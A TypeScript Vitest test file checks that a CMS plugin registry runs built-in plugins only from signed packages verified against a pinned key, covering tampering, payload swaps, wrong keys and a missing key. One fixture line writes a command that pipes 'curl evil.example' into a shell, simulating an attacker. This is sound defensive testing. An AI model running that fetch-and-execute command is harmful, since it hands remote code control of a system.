import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { buildPackage, generateKeyPair, openPackage, wrap } from "@zcmsorg/package";
import { loadBuiltinPlugin } from "../registry";

/**
 * A built-in plugin is only "verified" if a tampered one actually fails to run.
 *
 * Everything below constructs a real signed `.zcms` on disk and points the registry
 * at it, because the property under test is not "does the function call verify()" —
 * it is "can an attacker who owns the volume get code into the isolate". The volume
 * is the threat model here: a bad image layer, a mounted host path, a compromised CI
 * step. Each test is one of them.
 */

const KEYS = generateKeyPair();
const OTHER = generateKeyPair();

let dir: string;
let cacheDir: string;

/** Writes a signed built-in plugin into a fresh PLUGIN_DIR. */
async function publish(source: string, opts: { key?: string; version?: string } = {}) {
  return publishAs("demo", "vn.zsoft.plugin.demo", source, opts);
}

async function publishAs(
  folder: string,
  id: string,
  source: string,
  opts: { key?: string; version?: string } = {},
) {
  const pluginDir = path.join(dir, folder);
  fs.mkdirSync(path.join(pluginDir, "dist"), { recursive: true });

  const manifest = {
    id,
    name: "Demo",
    version: opts.version ?? "1.0.0",
    author: { name: "Z-SOFT Co., Ltd" },
    engine: ">=0.1.0",
    entry: "dist/index.js",
    permissions: [],
  };

  fs.writeFileSync(path.join(pluginDir, "plugin.json"), JSON.stringify(manifest));
  fs.writeFileSync(path.join(pluginDir, "dist/index.js"), source);

  const { file } = await buildPackage(
    pluginDir,
    "plugin",
    opts.key ?? KEYS.privateKey,
    KEYS.publicKey,
  );
  fs.writeFileSync(path.join(pluginDir, `${folder}.zcms`), file);

  return pluginDir;
}

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "zcms-builtin-test-"));
  cacheDir = fs.mkdtempSync(path.join(os.tmpdir(), "zcms-builtin-cache-"));
  process.env.PLUGIN_DIR = dir;
  process.env.PLUGIN_BUILTIN_CACHE_DIR = cacheDir;
  process.env.FIRST_PARTY_PUBLIC_KEY = KEYS.publicKey;
  delete process.env.NODE_ENV; // no caching between cases
});

afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true });
  fs.rmSync(cacheDir, { recursive: true, force: true });
});

describe("loadBuiltinPlugin", () => {
  it("runs a plugin signed with the pinned first-party key", async () => {
    await publish("module.exports.default = { manifest: {} };");

    const loaded = await loadBuiltinPlugin("vn.zsoft.plugin.demo");

    expect(loaded.version).toBe("1.0.0");
    expect(loaded.code).toContain("module.exports.default");
  });

  it("REFUSES a bundle edited on the volume after signing", async () => {
    // The attack the whole change exists for. Previously the runtime read
    // dist/index.js off disk and ran it, so this line of code would have executed.
    const pluginDir = await publish("module.exports.default = { manifest: {} };");

    fs.writeFileSync(
      path.join(pluginDir, "dist/index.js"),
      "require('child_process').execSync('curl evil.example | sh');",
    );

    // Nothing even reads that file any more — the code comes out of the signed
    // payload — so the edit is not so much rejected as irrelevant. Prove it both
    // ways: it loads, and what it loads is NOT what the attacker wrote.
    const loaded = await loadBuiltinPlugin("vn.zsoft.plugin.demo");
    expect(loaded.code).not.toContain("child_process");
    expect(loaded.code).toContain("module.exports.default");
  });

  it("REFUSES a package whose payload was swapped inside the .zcms", async () => {
    // One step up from the last: the attacker knows about the signature and edits the
    // artefact itself, leaving the envelope's checksum alone.
    const pluginDir = await publish("module.exports.default = { manifest: {} };");
    const file = path.join(pluginDir, "demo.zcms");

    const { envelope, payload } = await openPackage(fs.readFileSync(file));
    expect(envelope.checksum).toBeTruthy();

    // Corrupt the signed payload.
    const tampered = Buffer.concat([payload, Buffer.from([0x00])]);

    // Rebuild the .zcms around the tampered payload, keeping the original envelope
    // (checksum + signature) intact — which is precisely what a naive attacker does:
    // the signature still verifies against the checksum, because the checksum is the
    // one they did not change. What catches this is hashing the bytes we ACTUALLY
    // have and comparing, before the signature is even consulted.
    fs.writeFileSync(file, await wrap(envelope, tampered));

    await expect(loadBuiltinPlugin("vn.zsoft.plugin.demo")).rejects.toThrow(
      /Checksum mismatch/,
    );
  });

  it("REFUSES a package signed with a key we did not pin", async () => {
    // The attacker signs properly — with their own key. This is why the runtime
    // verifies against the PINNED key and never against `envelope.publisherKey`: a
    // package that carries the key that vouches for it vouches for nothing.
    await publish("module.exports.default = { manifest: {} };", { key: OTHER.privateKey });

    await expect(loadBuiltinPlugin("vn.zsoft.plugin.demo")).rejects.toThrow(
      /Invalid first-party signature/,
    );
  });

  it("REFUSES to run anything when no key is pinned", async () => {
    // Fail closed. An operator who forgot the env var gets a plugin that does not
    // run, not a plugin that runs unverified.
    await publish("module.exports.default = { manifest: {} };");
    delete process.env.FIRST_PARTY_PUBLIC_KEY;

    await expect(loadBuiltinPlugin("vn.zsoft.plugin.demo")).rejects.toThrow(
      /FIRST_PARTY_PUBLIC_KEY is not configured/,
    );
  });

  it("does not confuse one plugin's signed package for another's", async () => {
    // Discovery scans every .zcms under PLUGIN_DIR, so the match has to be on the
    // manifest inside the VERIFIED payload — not on a directory name, and not on the
    // plugin.json sitting unsigned beside it.
    await publishAs("alpha", "vn.zsoft.plugin.a", "module.exports = 'A';");
    await publishAs("beta", "vn.zsoft.plugin.b", "module.exports = 'B';");

    expect((await loadBuiltinPlugin("vn.zsoft.plugin.a")).code).toBe("module.exports = 'A';");
    expect((await loadBuiltinPlugin("vn.zsoft.plugin.b")).code).toBe("module.exports = 'B';");
  });

  it("says so when a plugin has no signed package at all", async () => {
    fs.mkdirSync(path.join(dir, "unsigned", "dist"), { recursive: true });
    fs.writeFileSync(
      path.join(dir, "unsigned", "plugin.json"),
      JSON.stringify({ id: "vn.zsoft.plugin.unsigned", version: "1.0.0" }),
    );
    fs.writeFileSync(path.join(dir, "unsigned", "dist/index.js"), "module.exports = {};");

    // A loose dist/index.js is not a plugin any more. It is a file.
    await expect(loadBuiltinPlugin("vn.zsoft.plugin.unsigned")).rejects.toThrow(
      /no signed package/,
    );
  });
});
